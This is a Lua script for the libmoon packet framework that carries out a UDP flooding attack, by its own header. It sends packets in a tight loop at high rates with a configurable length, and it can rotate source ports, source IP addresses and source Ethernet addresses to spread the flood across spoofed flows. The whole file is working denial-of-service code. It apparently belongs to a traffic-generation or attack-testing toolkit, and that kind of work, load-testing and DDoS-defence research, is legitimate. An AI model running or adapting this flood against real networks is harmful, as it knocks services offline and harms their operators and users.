--- A simple UDP flooding attack script
local libmoon = require "libmoon"
local log = require "log"
local memory = require "memory"
local stats = require "stats"

local attack = require "attack"
local fieldModifier = require "fieldModifier"

local ffi = require "ffi"

-- the configure function is called on startup with a pre-initialized command line parser
function configure(parser)
	attack.configure_pars(parser)
	parser:description("UDP Flooding Attack.")

	parser:option("--pktLength", "Packet length of udp packets."):args(1):convert(tonumber):default(60)

	parser:option("--flows", "Number of flows used in the flood by using different source ports. 0 results in 65535 flows (max port count)."):args(1):convert(tonumber):default(1)
	parser:option("--ipFlows", "Number of flows used in the flood by using different source IP addresses. Max 255"):args(1):convert(tonumber):default(1)
	parser:option("--ethFlows", "Number of flows used in the flood by using different source ethernet addresses. Max 255"):args(1):convert(tonumber):default(1)

	return parser:parse()
end

master = attack.main
local taskRunning = attack.taskRunning

function txTask(threadId, queue, args)
	log:info("Started txTask.")
	local PKT_LEN = args.pktLength

	local slowRate = false
	local lastSent = 0
	if args.rate < 100 then
		slowRate = args.queueRate
	end

	local udpSrcModifier
	if args.flows and not (args.flows == 1) then
		udpSrcModifier = fieldModifier.field_inc.udpSrc((args.flows))
	end

	local ipSrcModifier
	if args.ipFlows and not (args.ipFlows == 1) then
		ipSrcModifier = fieldModifier.field_inc.ipSrc_3(args.ipFlows)
	end

	local ethSrcModifier
	if args.ethFlows and not (args.ethFlows == 1) then
		ethSrcModifier = fieldModifier.field_inc.ethSrc_5(args.ethFlows)
	end

	local mempool = memory.createMemPool()
	local bufs = mempool:bufArray()

	local udpPkt, pktLen = createUDPPkt(args, mempool)

	attack.txTask_sync_start(args)

	while taskRunning(args) do
		if slowRate then
			bufs:allocN(pktLen, 1)
		else
			bufs:alloc(pktLen)
		end
		local sizeSum = 0

		for i, buf in ipairs(bufs) do
			-- packet framework allows simple access to fields in complex protocol stacks
			local pkt = buf:getUdpPacket()

			-- similar to pkt:setRawPacket
			ffi.copy(pkt, udpPkt, 42)

			sizeSum = sizeSum + buf:getSize()

			if udpSrcModifier then
				udpSrcModifier:set_field(pkt)
			end
			
			if ipSrcModifier then
				ipSrcModifier:set_field(pkt)
			end

			if ethSrcModifier then
				ethSrcModifier:set_field(pkt)
			end

			attack.txTask_setChecksumOffloading(buf, args)
		end

		if slowRate then
			local now = libmoon.getTime()
			local sizeBit = sizeSum * 8

			while (sizeBit / (now - lastSent)) > slowRate * 1000000 do
				now = libmoon.getTime()
			end
			lastSent = now
		end

		attack.txTask_send(queue, bufs)
	end

	log:info("Terminate txTask.")
end

rxTask = attack.rxTask


function createUDPPkt(args, mempool)
	local pktLen = args.pktLength

	local bufArray = mempool:bufArray()
	bufArray:alloc(pktLen, 1)
	local buf = bufArray[1]
	local pkt = buf:getUdpPacket()

	pkt:fill{
		-- fields not explicitly set here are initialized to reasonable defaults
		pktLength = pktLen
	}

	attack.modifyPkt(buf, args)

	-- raw packet
	local res = ffi.new("uint8_t [?]", pktLen)
	-- similar to pkt:setRawPacket
	ffi.copy(res, pkt, pktLen)

	bufArray:freeAll()

	return res, pktLen
end